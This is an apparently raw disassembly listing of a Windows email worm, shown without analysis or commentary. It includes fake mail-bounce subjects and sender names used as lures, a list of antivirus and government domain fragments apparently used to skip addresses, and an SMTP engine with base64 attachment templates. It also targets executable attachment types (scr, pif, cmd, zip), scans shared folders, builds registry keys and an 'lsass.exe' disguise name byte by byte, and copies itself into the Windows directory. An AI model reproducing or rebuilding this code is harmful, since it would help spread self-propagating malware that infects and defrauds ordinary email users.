aGmail		db 'gmail',0            ; DATA XREF: .text:00801280o
		align 4
aSeclist	db 'seclist',0          ; DATA XREF: .text:0080127Co
aSecur		db 'secur',0            ; DATA XREF: .text:00801278o
					; .text:00801324o
		align 4
aMath		db 'math',0             ; DATA XREF: .text:00801274o
		align 4
aLabs		db 'labs',0             ; DATA XREF: .text:00801270o
		align 4
aBar_		db 'bar.',0             ; DATA XREF: .text:0080126Co
		align 4
aFoo_		db 'foo.',0             ; DATA XREF: .text:00801268o
		align 4
a_mil		db '.mil',0             ; DATA XREF: .text:00801264o
		align 4
aGov_		db 'gov.',0             ; DATA XREF: .text:00801260o
		align 4
a_gov		db '.gov',0             ; DATA XREF: .text:0080125Co
		align 4
aUpdate		db 'update',0           ; DATA XREF: .text:00801258o
		align 4
aUslis		db 'uslis',0            ; DATA XREF: .text:00801254o
		align 4
aDomain		db 'domain',0           ; DATA XREF: .text:00801250o
		align 4
aExample	db 'example',0          ; DATA XREF: .text:0080124Co
aOphos		db 'ophos',0            ; DATA XREF: .text:00801248o
		align 4
aSpersk		db 'spersk',0           ; DATA XREF: .text:00801244o
		align 4
aPanda		db 'panda',0            ; DATA XREF: .text:00801240o
		align 4
aHotmail	db 'hotmail',0          ; DATA XREF: .text:0080123Co
aMsn_		db 'msn.',0             ; DATA XREF: .text:00801238o
		align 4
aMicrosoft	db 'microsoft',0        ; DATA XREF: .text:00801234o
		align 4
aSarc_		db 'sarc.',0            ; DATA XREF: .text:00801230o
		align 10h
aSyma		db 'syma',0             ; DATA XREF: .text:0080122Co
		align 4
aAvp		db 'avp',0
; char a__[]
a__		db '_-!.',0             ; DATA XREF: sub_803B98+67o
					; sub_803B98+100o ...
		align 4
a__@		db '_-!.@',0            ; DATA XREF: sub_803B98+4Ao
					; sub_803B98+9Fo ...
		align 4
aSpm		db 'spm',0              ; DATA XREF: sub_804059+77o
; char a@[]
a@		db '@',0                ; DATA XREF: sub_804253+A4o
					; sub_805575+B3o
		align 8
byte_801738	db 20h			; DATA XREF: sub_8046C9+15r
		db '                               ',0
		dd 0Eh dup(0), 280000h,	29h, 27h dup(0), 2200000h, 54000000h
		db 1Ah,	80h, 0
		dd 1, 801A50h, 2, 801A4Ch, 1, 801730h, 2, 801A48h, 1, 801730h
					; DATA XREF: sub_8046C9+38o
		dd 2, 801A44h, 1, 801730h, 3, 801A40h, 1, 801730h, 4, 801A38h
		dd 1, 801730h, 4, 801A30h, 1, 801730h, 4, 801A28h, 1, 801730h
		dd 5, 801A20h, 1, 8014B0h, 5, 801A18h, 1, 8014B0h, 6, 801A10h
		dd 1, 801A50h, 5, 801A08h, 1, 801A50h, 4 dup(0)
byte_801908	db 0			; DATA XREF: sub_8047AC+39r
					; sub_8047AC+52r ...
		dd 8 dup(0), 2,	2 dup(0), 1000202h, 2 dup(1010101h), 1
		dd 2000000h, 6 dup(1010101h), 101h, 20000h, 6 dup(1010101h)
		dd 101h, 20h dup(0), 26000000h,	7073626Eh, 26000000h, 7073626Eh
		dd 5F00003Bh, 5F746F64h, 28000000h, 29746F64h, 5F000000h
		dd 5F7461h, 28000000h, 297461h,	2E000000h, 2E7461h, 28000000h
		dd 40002940h, 20000040h, 40000040h
		db 20h,	2 dup(0)
; char asc_801A50[]
asc_801A50	db ' ',0                ; DATA XREF: sub_805AA7+1C5o
		align 4
		db '  ',0
		align 4
; char a__1[]
a__1		db '*.*',0              ; DATA XREF: sub_804D32+EFo
; char aIncoming[]
aIncoming	db 'incoming',0         ; DATA XREF: sub_804D32+9Eo
		align 4
; char aFtproot[]
aFtproot	db 'ftproot',0          ; DATA XREF: sub_804D32+8Ao
; char aDownload[]
aDownload	db 'download',0         ; DATA XREF: sub_804D32+76o
		align 4
; char aShar[]
aShar		db 'shar',0             ; DATA XREF: sub_804D32+62o
		align 4
; char Name[]
Name		db 'USERPROFILE',0      ; DATA XREF: sub_804F46:loc_805026o
; char asc_801A90[]
asc_801A90	db ':\',0               ; DATA XREF: sub_8050B1+3Co
		align 8
; char aYahoo_com[]
aYahoo_com	db 'yahoo.com',0        ; DATA XREF: sub_805575+158o
		align 8
byte_801AA8	db 32h			; DATA XREF: sub_805729+B3o
					; sub_805729:loc_805816r
		align 4
; LPCSTR off_801AAC
off_801AAC	dd offset aMessage	; DATA XREF: sub_805729:loc_805822r
					; "message"
byte_801AB0	db 1Eh			; DATA XREF: sub_805729+E1r
		align 4
		dd offset aDocument	; "document"
		dd 1Eh,	8021B8h, 19h, 8021B0h, 19h, 8021A8h, 14h, 8021A0h
		dd 14h,	802198h, 14h, 80218Ch, 0Ah, 802184h, 0,	802180h
byte_801AF8	db 32h			; DATA XREF: sub_805729+112o
					; sub_805729:loc_805875r
		align 4
; LPCSTR off_801AFC
off_801AFC	dd offset aScr		; DATA XREF: sub_805729:loc_805881r
					; "scr"
byte_801B00	db 14h			; DATA XREF: sub_805729+140r
		dd 90000000h, 0A008014h, 94000000h, 0A008014h, 7C000000h
		dd 0A008021h, 78000000h, 5008021h, 74000000h, 8021h, 80000000h
		db 21h,	80h, 0
byte_801B30	db 50h			; DATA XREF: sub_8058E5+6Do
					; sub_8058E5:loc_80598Cr
		align 4
dword_801B34	dd 802150h		; DATA XREF: sub_8058E5:loc_805998r
byte_801B38	db 50h			; DATA XREF: sub_8058E5+9Br
		align 4
		dd offset aReturnedMailSe ; "Returned mail: see	transcript for detai"...
		dd 37h,	802100h, 32h, 8020DCh, 20h, 8020BCh, 1Eh, 802180h
		dd 14h,	8020ACh, 0Ch, 8020A4h, 0Ch, 80209Ch, 0Ch, 802094h
		dd 0Ch,	80208Ch, 5, 802088h, 5,	802080h, 2, 802060h, 2
		dd 802044h, 0, 802180h
dword_801BB0	dd 0Fh			; DATA XREF: sub_805D98+87o
					; sub_805D98:loc_805E54r
dword_801BB4	dd 802180h		; DATA XREF: sub_805D98:loc_805E60r
dword_801BB8	dd 14h			; DATA XREF: sub_805D98+B0r
		dd offset aTheOriginalMes ; "The original message was received at $w"...
		dd 14h,	801EC8h, 14h, 801C18h, 5, 8020BCh, 5, 801BE8h
		dd 0, 802180h, 20656854h, 6769726Fh, 6C616E69h,	73656D20h
		dd 65676173h, 73617720h, 636E6920h, 6564756Ch, 73612064h
		dd 74746120h, 6D686361h, 746E65h, 73696854h, 73654D20h
		dd 65676173h, 73617720h, 646E7520h, 76696C65h, 62617265h
		dd 6420656Ch, 74206575h, 6874206Fh, 6F662065h, 776F6C6Ch
		dd 20676E69h, 73616572h, 0D3A6E6Fh, 590A0D0Ah, 2072756Fh
		dd 7373656Dh, 20656761h, 20736177h, 20746F6Eh, 696C6564h
		dd 65726576h, 65622064h, 73756163h, 68742065h, 65642065h
		dd 6E697473h, 6F697461h, 6F63206Eh, 7475706Dh, 77207265h
		dd 0A0D7361h, 20746F6Eh, 63616572h, 6C626168h, 69772065h
		dd 6E696874h, 65687420h, 6C6C6120h, 6465776Fh, 65757120h
		dd 70206575h, 6F697265h, 54202E64h, 61206568h, 6E756F6Dh
		dd 666F2074h, 6D697420h, 610A0D65h, 73656D20h, 65676173h
		dd 20736920h, 75657571h, 62206465h, 726F6665h, 74692065h
		dd 20736920h, 75746572h, 64656E72h, 70656420h, 73646E65h
		dd 206E6F20h, 61636F6Ch, 6F63206Ch, 6769666Eh, 2D617275h
		dd 69740A0Dh, 70206E6Fh, 6D617261h, 72657465h, 0A0D2E73h
		dd 6F4D0A0Dh, 6C207473h, 6C656B69h, 68742079h, 20657265h
		dd 61207369h, 74656E20h, 6B726F77h, 6F727020h, 6D656C62h
		dd 61687420h, 72702074h, 6E657665h, 20646574h, 696C6564h
		dd 79726576h, 7562202Ch, 690A0D74h, 73692074h, 736C6120h
		dd 6F70206Fh, 62697373h, 7420656Ch, 20746168h, 20656874h
		dd 706D6F63h, 72657475h, 20736920h, 6E727574h, 6F206465h
		dd 202C6666h, 6420726Fh, 2073656Fh, 0D746F6Eh, 7661680Ah
		dd 20612065h, 6C69616Dh, 73797320h, 206D6574h, 6E6E7572h
		dd 20676E69h, 68676972h, 6F6E2074h, 0A0D2E77h, 6F590A0Dh
		dd 6D207275h, 61737365h, 77206567h, 6E207361h, 6420746Fh
		dd 76696C65h, 64657265h, 74697720h, 206E6968h, 64204424h
		dd 3A737961h, 6F480A0Dh, 24207473h, 73692069h, 746F6E20h
		dd 73657220h, 646E6F70h, 2E676E69h, 0A0D0A0Dh, 20656854h
		dd 6C6C6F66h, 6E69776Fh, 65722067h, 69706963h, 73746E65h
		dd 64696420h, 746F6E20h, 63657220h, 65766965h, 69687420h
		dd 656D2073h, 67617373h, 0A0D3A65h, 3E74243Ch, 0A0D0A0Dh
		dd 61656C50h, 72206573h, 796C7065h, 206F7420h, 74736F70h
		dd 7473616Dh, 24407265h, 690A0D46h, 6F792066h, 65662075h
		dd 74206C65h, 20736968h, 7373656Dh, 20656761h, 62206F74h
		dd 6E692065h, 72726520h, 0D2E726Fh, 0A0D0Ah, 0,	20656854h
		dd 6769726Fh, 6C616E69h, 73656D20h, 65676173h, 73617720h
		dd 63657220h, 65766965h, 74612064h, 0D772420h, 6F72660Ah
		dd 4624206Dh, 69245B20h, 0D0A0D5Dh, 2D2D2D0Ah, 54202D2Dh
		dd 66206568h, 6F6C6C6Fh, 676E6977h, 64646120h, 73736572h
		dd 68207365h, 70206461h, 616D7265h, 746E656Eh, 74616620h
		dd 65206C61h, 726F7272h, 2D2D2073h, 0D2D2D2Dh, 74243C0Ah
		dd 0D0A0D3Eh, 2D2D2D0Ah, 54202D2Dh, 736E6172h, 70697263h
		dd 666F2074h, 73657320h, 6E6F6973h, 6C6F6620h, 73776F6Ch
		dd 2D2D2D20h, 0A0D2D2Dh, 68772020h, 20656C69h, 6B6C6174h
		dd 20676E69h, 24206F74h, 0D3A2E54h, 3E3E3E0Ah, 49414D20h
		dd 7246204Ch, 243A6D6Fh, 3C0A0D66h, 35203C3Ch, 24203130h
		dd 2E2E2E66h, 66655220h, 64657375h, 0A0D0A0Dh, 2 dup(0)
aTheOriginalMes	db 'The original message was received at $w',0Dh,0Ah
					; DATA XREF: .text:00801BBCo
		db 'from $F [$i]',0Dh,0Ah
		db 0Dh,0Ah
		db '----- The following addresses had permanent fatal errors ---'
		db '--',0Dh,0Ah
		db '<$t>',0Dh,0Ah
		db 0Dh,0Ah,0
		align 4
aSayHeloToMyLit	db 'say helo to my litl friend',0
		align 10h
aClickMeBabyOne	db 'click me baby, one more time',0
		align 10h
aHello		db 'hello',0
		align 4
aHi		db 'hi',0
		align 4
aError		db 'error',0
		align 4
aStatus		db 'status',0
		align 4
aTest		db 'test',0
		align 4
aReport		db 'report',0
		align 4
aDeliveryFailed	db 'delivery failed',0
aMessageCouldNo	db 'Message could not be delivered',0
		align 4
aMailSystemErro	db 'Mail System Error - Returned Mail',0
		align 10h
aDeliveryReport	db 'Delivery reports about your e-mail',0
		align 4
aReturnedMailSe	db 'Returned mail: see transcript for details',0
					; DATA XREF: .text:00801B3Co
		align 10h
aReturnedMailDa	db 'Returned mail: Data format error',0
		align 4
aCmd		db 'cmd',0
aBat		db 'bat',0
aPif		db 'pif',0
		dd 0, 64616572h, 656Dh,	6E617274h, 69726373h, 7470h, 6C69616Dh
		dd 0, 7474656Ch, 7265h,	656C6966h, 0, 74786574h, 0
aAttachment	db 'attachment',0       ; DATA XREF: sub_8061F8+67o
		align 4
aDocument	db 'document',0         ; DATA XREF: .text:00801AB4o
		align 10h
aMessage	db 'message',0          ; DATA XREF: .text:off_801AACo
; char asc_8021D8[]
asc_8021D8	db '>',0                ; DATA XREF: sub_805575+D3o
		align 4
; char aPostmaster[]
aPostmaster	db 'postmaster',0       ; DATA XREF: sub_805575:loc_805620o
		align 4
aMailerDaemon_0	db 'MAILER-DAEMON',0    ; DATA XREF: sub_805575:loc_805619o
		align 4
aNoreply	db 'noreply',0          ; DATA XREF: sub_805575+9Do
; char asc_802200[]
asc_802200	db ' <',0               ; DATA XREF: sub_805575+7Fo
		align 4
; char aPostmaster_0[]
aPostmaster_0	db '"Postmaster"',0     ; DATA XREF: sub_805575:loc_8055E2o
		align 4
aMailAdministra	db '"Mail Administrator"',0 ; DATA XREF: sub_805575:loc_8055DBo
		align 4
aAutomaticEmail	db '"Automatic Email Delivery Software"',0
					; DATA XREF: sub_805575:loc_8055D4o
aPostOffice	db '"Post Office"',0    ; DATA XREF: sub_805575:loc_8055CDo
		align 10h
aThePostOffice	db '"The Post Office"',0 ; DATA XREF: sub_805575:loc_8055C6o
		align 4
aBouncedMail	db '"Bounced mail"',0   ; DATA XREF: sub_805575:loc_8055BFo
		align 4
aReturnedMail	db '"Returned mail"',0  ; DATA XREF: sub_805575:loc_8055B8o
aMailerDaemon	db '"MAILER-DAEMON"',0  ; DATA XREF: sub_805575:loc_8055B1o
aMailDeliverySu	db '"Mail Delivery Subsystem"',0 ; DATA XREF: sub_805575:loc_8055AAo
		align 10h
; char aS_S[]
aS_S		db '%s.%s',0            ; DATA XREF: sub_805729+17Ao
		align 4
; char a_com[]
a_com		db '.com',0             ; DATA XREF: sub_805729+4o
		align 10h
; char PrefixString[]
PrefixString	db 'tmp',0              ; DATA XREF: sub_805A22+2Co
					; sub_805AA7+94o ...
; char aS_zip[]
aS_zip		db '%s.zip',0           ; DATA XREF: sub_805AA7+26Eo
		align 4
; char aXe[]
aXe		db 'xe',0               ; DATA XREF: sub_805AA7+221o
		align 10h
; char aE[]
aE		db 'e',0                ; DATA XREF: sub_805AA7:loc_805CC0o
		align 4
aCr		db 'cr',0               ; DATA XREF: sub_805AA7+212o
		align 4
; char aS_0[]
aS_0		db 's',0                ; DATA XREF: sub_805AA7:loc_805CB1o
		align 4
aIf		db 'if',0               ; DATA XREF: sub_805AA7+203o
		align 10h
; char aP[]
aP		db 'p',0                ; DATA XREF: sub_805AA7+1FBo
		align 4
; char aDoc[]
aDoc		db 'doc',0              ; DATA XREF: sub_805AA7:loc_805C3Eo
aTxt		db 'txt',0              ; DATA XREF: sub_805AA7:loc_805C37o
aHtm		db 'htm',0              ; DATA XREF: sub_805AA7:loc_805C30o
aHtml		db 'html',0             ; DATA XREF: sub_805AA7+182o
		align 4
; char aD_D_D_D[]
aD_D_D_D	db '%d.%d.%d.%d',0      ; DATA XREF: sub_805D98+1ABo
		align 8
aAbcdefghijklmn	db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567'
					; DATA XREF: sub_805F6C+Ao
		db '89+/',0
		align 10h
; char aXPriority3XMsm[]
aXPriority3XMsm	db 'X-Priority: 3',0Dh,0Ah ; DATA XREF: sub_806125+C5o
		db 'X-MSMail-Priority: Normal',0Dh,0Ah
		db 'X-Mailer: Microsoft Outlook Express 6.00.2600.0000',0Dh,0Ah
		db 'X-MIMEOLE: Produced By Microsoft MimeOLE V6.00.2600.0000',0Dh
		db 0Ah
		db 0Dh,0Ah,0
		align 4
; char aContentTypeMul[]
aContentTypeMul	db 'Content-Type: multipart/mixed;',0Dh,0Ah ; DATA XREF: sub_806125+B5o
		db 9,'boundary="%s"',0Dh,0Ah,0
		align 10h
; char aMimeVersion1_0[]
aMimeVersion1_0	db 0Dh,0Ah		; DATA XREF: sub_806125+A9o
		db 'MIME-Version: 1.0',0Dh,0Ah,0
		align 4
; char aDate[]
aDate		db 'Date: ',0           ; DATA XREF: sub_806125+92o
		align 10h
; char aSubjectS[]
aSubjectS	db 'Subject: %s',0Dh,0Ah,0 ; DATA XREF: sub_806125+7Co
		align 10h
; char aToS[]
aToS		db 'To: %s',0Dh,0Ah,0   ; DATA XREF: sub_806125+65o
		align 4
; char aFromS[]
aFromS		db 'From: %s',0Dh,0Ah,0 ; DATA XREF: sub_806125+4Eo
		align 4
; char a_S__3u__4u__8x[]
a_S__3u__4u__8x	db '----=_%s_%.3u_%.4u_%.8X.%.8X',0 ; DATA XREF: sub_806125+39o
		align 4
aNextpart	db 'NextPart',0         ; DATA XREF: sub_806125+34o
		align 4
; char aS[]
aS		db 0Dh,0Ah		; DATA XREF: sub_8061F8+B7o
		db 0Dh,0Ah
		db '--%s--',0Dh,0Ah
		db 0Dh,0Ah,0
		align 8
; char aSContentTypeAp[]
aSContentTypeAp	db '--%s',0Dh,0Ah       ; DATA XREF: sub_8061F8+86o
		db 'Content-Type: application/octet-stream;',0Dh,0Ah
		db 9,'name="%s"',0Dh,0Ah
		db 'Content-Transfer-Encoding: base64',0Dh,0Ah
		db 'Content-Disposition: %s;',0Dh,0Ah
		db 9,'filename="%s"',0Dh,0Ah
		db 0Dh,0Ah,0
		align 4
aInline		db 'inline',0           ; DATA XREF: sub_8061F8+71o
		align 4
; char asc_80254C[]
asc_80254C	db 0Dh,0Ah		; DATA XREF: sub_8061F8+4Do
		db 0Dh,0Ah
		db 0Dh,0Ah,0
		align 8
; char aSContentTypeTe[]
aSContentTypeTe	db '--%s',0Dh,0Ah       ; DATA XREF: sub_8061F8+2Fo
		db 'Content-Type: text/plain;',0Dh,0Ah
		db 9,'charset=us-ascii',0Dh,0Ah
		db 'Content-Transfer-Encoding: 7bit',0Dh,0Ah
		db 0Dh,0Ah,0
; char aThisIsAMultiPa[]
aThisIsAMultiPa	db 'This is a multi-part message in MIME format.',0Dh,0Ah
					; DATA XREF: sub_8061F8+15o
		db 0Dh,0Ah,0
		align 4
aQuit		db 'QUIT',0Dh,0Ah,0     ; DATA XREF: sub_806765+255o
		align 4
; char buf[]
buf		db 0Dh,0Ah		; DATA XREF: sub_806765+22Eo
		db '.',0Dh,0Ah,0
		align 4
aData		db 'DATA',0Dh,0Ah,0     ; DATA XREF: sub_806765+1A8o
		align 4
aRcSoS		db 'RC%sO:<%s>',0Dh,0Ah,0 ; DATA XREF: sub_806765+186o
		align 4
aPtT		db 'PT T',0             ; DATA XREF: sub_806765+181o
		align 4
aMaSromS	db 'MA%sROM:<%s>',0Dh,0Ah,0 ; DATA XREF: sub_806765+158o
		align 4
aIlF		db 'IL F',0             ; DATA XREF: sub_806765+153o
		align 4
aSoS		db '%sO %s',0Dh,0Ah,0   ; DATA XREF: sub_806765+12Ao
		align 4
aHel		db 'HEL',0              ; DATA XREF: sub_806765+125o
aESS		db 'E%s %s',0Dh,0Ah,0   ; DATA XREF: sub_806765+104o
		align 4
aHlo		db 'HLO',0              ; DATA XREF: sub_806765+FFo
aTo		db 'To',0               ; DATA XREF: sub_806765+42o
					; sub_806B4F+1Co
		align 10h
aFrom		db 'From',0             ; DATA XREF: sub_806765+1Ao
		align 4
; char aSS[]
aSS		db '%s %s',0            ; DATA XREF: sub_8069EA+3Bo
		align 10h
aSmtp		db 'SMTP',0             ; DATA XREF: sub_8069EA+30o
		align 4
aServer		db 'Server',0           ; DATA XREF: sub_8069EA+2Bo
		align 10h
; char aSoftwareMicros[]
aSoftwareMicros	db 'Software\Microsoft\%s %s Manager\%ss',0 ; DATA XREF: sub_8069EA+23o
		align 4
aInternet	db 'Internet',0         ; DATA XREF: sub_8069EA+18o
		align 4
aAccount	db 'Account',0          ; DATA XREF: sub_8069EA+10o
aMx_		db 'mx.',0              ; DATA XREF: sub_806B4F:loc_806C4Co
aMail_		db 'mail.',0            ; DATA XREF: sub_806B4F:loc_806C45o
		align 4
aSmtp_		db 'smtp.',0            ; DATA XREF: sub_806B4F+C6o
		align 10h
byte_8026C0	db 7			; DATA XREF: sub_806CF9+A6r
		dd 516110Ch, 4140E09h, 617100Bh
		db 0Ah,	0Fh, 15h
byte_8026D0	db 0			; DATA XREF: sub_806CF9+DBr
byte_8026D1	db 1			; DATA XREF: sub_806CF9+CDr
byte_8026D2	db 2			; DATA XREF: sub_806CF9+C2r
byte_8026D3	db 3			; DATA XREF: sub_806CF9+B7r
		dd 2010003h, 1000302h, 30201h
byte_8026E0	db 0			; DATA XREF: sub_806CF9+84r
byte_8026E1	db 1			; DATA XREF: sub_806CF9:loc_806D6Er
		dd 3050501h
		db 0, 7
dword_8026E8	dd 0EB830C71h, 0B952F4F7h, 0A2148E4Ah, 0B0B38EB3h, 0B3E46CBFh
					; DATA XREF: sub_8075B2+11Eo
		dd 327CDC1Eh, 0D45E7EB6h, 122B485Dh, 43FB459Fh,	0F311872Fh
		dd 0DC432613h, 1E500FD7h, 3AD8A0FCh, 5D802EBBh,	686C4B20h
		dd 89890B4Ah
dword_802728	dd 0Fh dup(0), 1000100h	; DATA XREF: sub_8075B2+126o
dword_802768	dd 7478742Eh, 0		; DATA XREF: sub_8071E7+140o
dword_802770	dd 6272h		; DATA XREF: sub_807400+12o
					; sub_8075B2+14Bo
dword_802774	dd 6277h		; DATA XREF: sub_8074A2+Eo
					; sub_8075B2+C5o
; char aS_1[]
aS_1		db '"%s"',0             ; DATA XREF: sub_8075B2+1F5o
		align 10h
; char aTmpD_CCC[]
aTmpD_CCC	db 'tmp%d.%c%c%c',0     ; DATA XREF: sub_8075B2+A5o
		align 10h

;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_802790	proc near		; CODE XREF: sub_802CB2+9p

SubKey		= byte ptr -38h
var_35		= byte ptr -35h
var_34		= byte ptr -34h
var_33		= byte ptr -33h
var_32		= byte ptr -32h
var_31		= byte ptr -31h
var_30		= byte ptr -30h
var_2F		= byte ptr -2Fh
var_2E		= byte ptr -2Eh
var_2D		= byte ptr -2Dh
var_2C		= byte ptr -2Ch
var_2B		= byte ptr -2Bh
var_2A		= byte ptr -2Ah
var_29		= byte ptr -29h
var_28		= byte ptr -28h
var_27		= byte ptr -27h
var_26		= byte ptr -26h
var_25		= byte ptr -25h
var_24		= byte ptr -24h
var_23		= byte ptr -23h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= byte ptr -20h
var_1F		= byte ptr -1Fh
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_1C		= byte ptr -1Ch
var_1B		= byte ptr -1Bh
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= byte ptr -18h
var_17		= byte ptr -17h
var_16		= byte ptr -16h
var_15		= byte ptr -15h
var_14		= byte ptr -14h
var_13		= byte ptr -13h
var_12		= byte ptr -12h
var_11		= byte ptr -11h
var_10		= byte ptr -10h
var_F		= byte ptr -0Fh
var_E		= byte ptr -0Eh
var_D		= byte ptr -0Dh
var_C		= byte ptr -0Ch
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
dwDisposition	= dword	ptr -8
hKey		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		xor	ebx, ebx
		push	edi
		mov	[ebp+SubKey], 53h
		mov	byte ptr [ebp-37h], 6Fh
		mov	byte ptr [ebp-36h], 66h
		mov	[ebp+var_35], 74h
		mov	[ebp+var_34], 77h
		mov	[ebp+var_33], 61h
		mov	[ebp+var_32], 72h
		mov	[ebp+var_31], 65h
		mov	[ebp+var_30], 5Ch
		mov	[ebp+var_2F], 4Dh
		mov	[ebp+var_2E], 69h
		mov	[ebp+var_2D], 63h
		mov	[ebp+var_2C], 72h
		mov	[ebp+var_2B], 6Fh
		mov	[ebp+var_2A], 73h
		mov	[ebp+var_29], 6Fh
		mov	[ebp+var_28], 66h
		mov	[ebp+var_27], 74h
		mov	[ebp+var_26], 5Ch
		mov	[ebp+var_25], 57h
		mov	[ebp+var_24], 69h
		mov	[ebp+var_23], 6Eh
		mov	[ebp+var_22], 64h
		mov	[ebp+var_21], 6Fh
		mov	[ebp+var_20], 77h
		mov	[ebp+var_1F], 73h
		mov	[ebp+var_1E], 5Ch
		mov	[ebp+var_1D], 43h
		mov	[ebp+var_1C], 75h
		mov	[ebp+var_1B], 72h
		mov	[ebp+var_1A], 72h
		mov	[ebp+var_19], 65h
		mov	[ebp+var_18], 6Eh
		mov	[ebp+var_17], 74h
		mov	[ebp+var_16], 56h
		mov	[ebp+var_15], 65h
		mov	[ebp+var_14], 72h
		mov	[ebp+var_13], 73h
		mov	[ebp+var_12], 69h
		mov	[ebp+var_11], 6Fh
		mov	[ebp+var_10], 6Eh
		mov	[ebp+var_F], 5Ch
		mov	[ebp+var_E], 50h
		mov	[ebp+var_D], 4Fh
		mov	[ebp+var_C], 53h
		mov	[ebp+var_B], 49h
		mov	[ebp+var_A], 58h
		mov	[ebp+var_9], bl
		mov	[esi], ebx
		mov	byte ptr [ebp+arg_0+3],	bl
		mov	edi, 80000002h

loc_802867:				; CODE XREF: sub_802790+100j
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	20019h		; samDesired
		lea	eax, [ebp+SubKey]
		push	ebx		; ulOptions
		push	eax		; lpSubKey
		mov	al, byte ptr [ebp+arg_0+3]
		neg	al
		sbb	eax, eax
		add	eax, edi
		push	eax		; hKey
		call	ds:RegOpenKeyExA
		test	eax, eax
		jz	short loc_8028DB
		inc	byte ptr [ebp+arg_0+3]
		cmp	byte ptr [ebp+arg_0+3],	2
		jl	short loc_802867
		mov	dword ptr [esi], 1
		mov	byte ptr [ebp+arg_0+3],	bl

loc_80289B:				; CODE XREF: sub_802790+144j
		lea	eax, [ebp+dwDisposition]
		push	eax		; lpdwDisposition
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	ebx		; lpSecurityAttributes
		push	20006h		; samDesired
		push	ebx		; dwOptions
		push	ebx		; lpClass
		lea	eax, [ebp+SubKey]
		push	ebx		; Reserved
		push	eax		; lpSubKey
		mov	al, byte ptr [ebp+arg_0+3]
		neg	al
		sbb	eax, eax
		add	eax, edi
		push	eax		; hKey
		call	ds:RegCreateKeyExA
		test	eax, eax
		jnz	short loc_8028CD
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey

loc_8028CD:				; CODE XREF: sub_802790+132j
		inc	byte ptr [ebp+arg_0+3]
		cmp	byte ptr [ebp+arg_0+3],	2
		jl	short loc_80289B

loc_8028D6:				; CODE XREF: sub_802790+154j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8028DB:				; CODE XREF: sub_802790+F7j
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		jmp	short loc_8028D6
sub_802790	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8028E6	proc near		; CODE XREF: sub_802CB2+29p

Name		= byte ptr -168h
var_68		= dword	ptr -68h
var_10		= dword	ptr -10h

		push	ebp
		mov	ebp, esp
		sub	esp, 168h
		push	esi
		mov	esi, 100h
		push	esi
		lea	eax, [ebp+Name]
		push	0
		push	eax
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Name]
		push	esi		; namelen
		push	eax		; name
		call	ds:gethostname
		lea	eax, [ebp+var_68]
		push	eax
		call	sub_806CD1
		lea	eax, [ebp+Name]
		push	esi
		push	eax
		lea	eax, [ebp+var_68]
		push	eax
		call	sub_806E83
		lea	eax, [ebp+var_68]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		call	sub_806F2B
		push	esi
		lea	eax, [ebp+Name]
		push	0
		push	eax
		call	memset
		add	esp, 24h
		xor	ecx, ecx
		pop	esi

loc_802951:				; CODE XREF: sub_8028E6+93j
		mov	al, byte ptr [ebp+ecx+var_10]
		mov	dl, al
		add	dl, 2
		and	dl, 0Fh
		mov	[ebp+ecx*2+Name], dl
		mov	dl, 0F9h
		shr	al, 4
		sub	dl, al
		and	dl, 0Fh
		mov	[ebp+ecx*2-167h], dl
		inc	ecx
		cmp	ecx, 10h
		jl	short loc_802951
		lea	eax, [ebp+Name]
		push	eax		; lpName
		push	1		; bInitialOwner
		push	0		; lpMutexAttributes
		call	ds:CreateMutexA
		call	ds:GetLastError
		sub	eax, 0B7h
		neg	eax
		sbb	eax, eax
		inc	eax
		leave
		retn
sub_8028E6	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_80299E	proc near		; CODE XREF: sub_802CB2+35p

ExistingFileName= byte ptr -22Ch
String2		= byte ptr -128h
lpString1	= dword	ptr -10h
var_C		= byte ptr -0Ch
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= byte ptr -8
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= byte ptr -4
var_3		= byte ptr -3
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 22Ch
		push	ebx
		push	esi
		push	edi
		lea	eax, [ebp+ExistingFileName]
		xor	ebx, ebx
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		mov	[ebp+var_C], 6Ch
		mov	byte ptr [ebp-0Bh], 73h
		mov	[ebp+var_A], 61h
		mov	[ebp+var_9], 73h
		mov	[ebp+var_8], 73h
		mov	[ebp+var_7], 2Eh
		mov	[ebp+var_6], 65h
		mov	[ebp+var_5], 78h
		mov	[ebp+var_4], 65h
		mov	[ebp+var_3], bl
		call	ds:GetModuleFileNameA
		mov	eax, [ebp+arg_0]
		mov	edi, ds:lstrcpyA
		lea	ecx, [ebp+ExistingFileName]
		add	eax, 4
		push	ecx		; lpString2
		push	eax		; lpString1
		mov	[ebp+lpString1], eax
		call	edi ; lstrcpyA
		mov	esi, ds:lstrcatA
		mov	[ebp+arg_0], ebx

loc_802A08:				; CODE XREF: sub_80299E+14Bj
		cmp	[ebp+arg_0], ebx
		lea	eax, [ebp+String2]
		jnz	short loc_802A21
		push	118h		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		jmp	short loc_802A2D
